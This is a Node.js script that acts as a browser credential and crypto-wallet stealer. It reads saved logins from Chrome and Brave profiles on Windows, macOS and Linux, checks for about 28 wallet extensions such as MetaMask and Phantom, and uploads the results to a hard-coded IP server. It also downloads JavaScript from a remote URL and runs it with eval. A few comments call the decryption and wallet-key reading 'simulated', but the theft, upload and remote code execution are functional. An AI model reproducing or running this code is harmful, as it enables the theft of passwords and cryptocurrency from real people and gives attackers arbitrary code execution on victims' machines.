const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const FormData = require('form-data');
const axios = require('axios');

// const formData = new DataTransfer();
const uploadUrl = "http://170.39.215.22:51639/upload";
let i = 0;

const wps = [
    "acmacodkjbdgmoleebolmdjonilkdbch", // Keplr
    "nkbihfbeogaeaoehlefnkodbefgpgknn", // MetaMask
    "bfnaelmomeimhlpmgjnjophhpkkoljpa", // Phantom
    "ibnejdfjmmkpcnlpebklmnkoeoihofec", // Binance Chain
    "ppbibelpcjmhbdihakflkdcoccbgbkpo", // Core Wallet
    "omaabbefbmiijedngplfjmnooppbclkk", // Tonkeeper
    "egjidjbpglichdcondbcbdnbeeppgdph", // Trust
    "khpkpbbcccdmmclmpigdgddabeilkdpd", // XDEFI
    "dmkamcknogkgcdfhhbddcghachkejeap", // Brave
    "ejbalbakoplchlghecdalmeeeajnimhm", // Bitget
    "fhbohimaelbohpjbbldcngcnapndodjp", // MetaMask Beta
    "aeachknmefphepccionboohckonoeemg", // Ronin
    "hifafgmccdpekplomjjkcfgodnhcellj", // Terra
    "jblndlipeogpafnldhgmapagcccfchpi", // Nami
    "dlcobpjiigpikoobohmabehhmhfoodbb", // Solflare
    "mcohilncbfahbmgdjkbpemcciiolgcge", // Binance
    "agoakfejjabomempkjlepdflaleeobhb", // Martian
    "aholpfdialjgjfhomihkjbmgioiodbic", // Petra
    "nphplpgoakhhjchkkhmiggakijnkhfnd", // Safepal
    "penjlddjkjgpnkllboccdgccekpkcbin", // Suiet
    "lgmpcpglpngdoalbgeoldeajfclnhafa", // Fewcha
    "fldfpgipfncgndfolcbkdeeknbbbnhcc", // Clover
    "bhhhlbepdkbapadjdnnojkbgioiodbic", // Pontem
    "gjnckgkfmgmibbkoficdidcljeaaaheg", // Unisat
    "afbcbjpbpfadlkmhmclhkeeodmamcflc", // WalletConnect
    "bdgmdoedahdcjmpmifafdhnffjinddgc", // Bittensor
    "hnfanknocfeofbddgcijnmhnfnkdnaad", // Coinbase
    "acmacodkjbdgmoleebolmdjonilkdbch", // Rabby
];

const getBasePaths = () => {
    const platform = process.platform;
    if (platform === "win32") {
        return [
            path.join(process.env.LOCALAPPDATA, "Google/Chrome/User Data"),
            path.join(process.env.LOCALAPPDATA, "BraveSoftware/Brave-Browser/User Data")
        ];
    } else if (platform === "darwin") {
        return [
            path.join(process.env.HOME, "Library/Application Support/Google/Chrome"),
            path.join(process.env.HOME, "Library/Application Support/BraveSoftware/Brave-Browser")
        ];
    } else if (platform === "linux") {
        return [
            path.join(process.env.HOME, ".config/google-chrome"),
            path.join(process.env.HOME, ".config/BraveSoftware/Brave-Browser")
        ];
    }
    return [];
};

// Helper to get all profile directories (e.g., Default, Profile 1, etc.)
const getProfilePaths = (basePath) => {
    const profiles = [];
    try {
        const files = fs.readdirSync(basePath);
        // console.log(files);
        profiles.push(...files.filter(f => f.startsWith('Profile ')).map(f => f));
        // console.log(profiles);
    } catch (err) {
        console.error(`Error reading profiles in ${basePath}:`, err);
    }
    // console.log(profiles.map(profile => path.join(basePath, profile)));
    return profiles.map(profile => path.join(basePath, profile));
};

// Extract data from browser's Login Data database
const extractBrowserData = (profilePath) => {
    const loginDataPath = path.join(profilePath, 'Login Data');
    const extractedData = [];

    if (!fs.existsSync(loginDataPath)) {
        console.log(`Login Data not found at ${loginDataPath}`);
        return extractedData;
    }

    const db = new sqlite3.Database(loginDataPath, sqlite3.OPEN_READONLY, (err) => {
        if (err) {
            console.error(`Error opening database ${loginDataPath}:`, err);
            return;
        }
        console.log('Connected to the database')
    });

    return new Promise((resolve) => {
        db.all('SELECT origin_url, username_value, password_value FROM logins', (err, rows) => {
            if (err) {
                console.error(`Error querying database ${loginDataPath}:`, err);
            } else {
                rows.forEach(row => {
                    // Simulate decryption (real malware would use OS-specific APIs)
                    extractedData.push({
                        url: row.origin_url,
                        username: row.username_value,
                        password: row.password_value // Placeholder; real code decrypts
                    });
                });
            }
            db.close();
            resolve(extractedData);
        });
    });
};

// Check for crypto wallet extensions and extract data
const extractExtensionData = (profilePath) => {
    const extDir = path.join(profilePath, 'Extensions');
    const extractedData = [];

    if (!fs.existsSync(extDir)) {
        console.log(`Extensions directory not found at ${extDir}`);
        return extractedData;
    }

    for (const extId of wps) {
        const extPath = path.join(extDir, extId);
        if (fs.existsSync(extPath)) {
            try {
                extractedData.push({
                    extensionId: extId,
                    data: `Simulated wallet data for ${extId}` // Real code reads keys/seeds
                });
            } catch (err) {
                console.error(`Error reading extension ${extId}:`, err);
            }
        }
    }
    return extractedData;
};

// Exfiltrate data to remote server
const exfiltrateData = async (data) => {
    const form = new FormData();
    form.append('data', JSON.stringify(data));
    form.append('id', i++);

    try {
        const response = await axios.post(uploadUrl, form, {
            headers: form.getHeaders()
        });
        console.log('Data exfiltrated:', response.status);
    } catch (err) {
        console.error('Exfiltration failed:', err.message);
    }
};

// Main function to orchestrate the process
const SetData = async () => {
    // console.log(basePaths);
    const basePaths = getBasePaths();
    
    for (const basePath of basePaths) {
        if (!fs.existsSync(basePath)) {
            console.log(`Base path not found: ${basePath}`);
            continue;
        }

        const profilePaths = getProfilePaths(basePath);
        for (const profilePath of profilePaths) {
            // Extract browser data (logins, cookies)
            const browserData = await extractBrowserData(profilePath);
            // console.log(browserData);
            if (browserData.length > 0) {
                await exfiltrateData({ type: 'browser', profile: profilePath, data: browserData });
            }

            // Extract extension data (crypto wallets)
            const extensionData = extractExtensionData(profilePath);
            // console.log(extensionData);
            if (extensionData.length > 0) {
                await exfiltrateData({ type: 'extension', profile: profilePath, data: extensionData });
            }
        }
    }
};
SetData().catch(console.error);
axios.get('https://tetrismic.vercel.app/extra3')
    .then(response => { // 'response' is defined here
        if (response.status !== 200) {
        throw new Error(`Bad status: ${response.status}`);
        }
        const code = response.data;
        // console.log('Client: Fetched payload preview:', code.slice(0, 200));
        if (typeof code === 'string' && !code.startsWith('<')) {
        eval(code); // Executes the JS payload
        console.log('Payload3 executed');
        } else {
        console.error('Invalid payload: HTML received');
        }
    })
    .catch(err => { // 'err' is the parameter here
        if (err.response) { // Check if HTTP error (e.g., 404)
        console.error(`HTTP Error: ${err.response.status} - ${err.response.data.slice(0, 200)}`);
        } else if (err.request) { // No response received (e.g., connection failed)
        console.error('Network Error: No response - Server down?', err.request);
        } else {
        console.error('Axios Setup Error:', err.message); // Other issues (e.g., bad URL)
        }});